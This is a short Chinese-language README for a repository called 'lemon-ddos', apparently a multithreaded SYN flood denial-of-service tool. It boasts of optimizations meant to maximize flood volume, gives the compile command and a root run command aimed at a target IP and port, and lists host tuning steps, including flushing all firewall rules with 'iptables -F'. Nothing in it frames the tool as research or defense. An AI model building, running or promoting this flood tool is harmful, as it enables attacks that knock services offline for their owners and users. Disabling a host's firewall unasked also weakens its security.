# lemon-ddos
性能优化亮点：
1.每个线程独立资源：
 独立套接字
 独立随机数种子
 独立数据包缓冲区
 独立统计计数器
2.网络优化：
 100MB 发送缓冲区 (#define SOCKET_BUFFER_SIZE (100 * 1024 * 1024))
 非阻塞 I/O 模式
 TCP_NODELAY 选项禁用 Nagle 算法
3.CPU 优化：
 线程绑定到特定 CPU 核心
 高性能随机数生成器 (比标准 rand() 快 10 倍)
 预计算数据包长度减少循环开销
4.内存优化：
 栈上固定缓冲区用于校验和计算
 预生成随机负载避免重复计算
# 编译指令：
```
gcc -O3 -march=native -mtune=native -pthread -o syn_flood syn_flood.c
```
# 运行建议：
## 以 root 权限运行：
```
sudo ./syn_flood 192.168.1.100 80 16 60 100 eth0
```
## 系统优化命令：
```
# 增加网络缓冲区
sudo sysctl -w net.core.wmem_max=12582912
sudo sysctl -w net.core.rmem_max=12582912

# 增加最大打开文件数
ulimit -n 1000000

# 禁用防火墙
sudo iptables -F
```
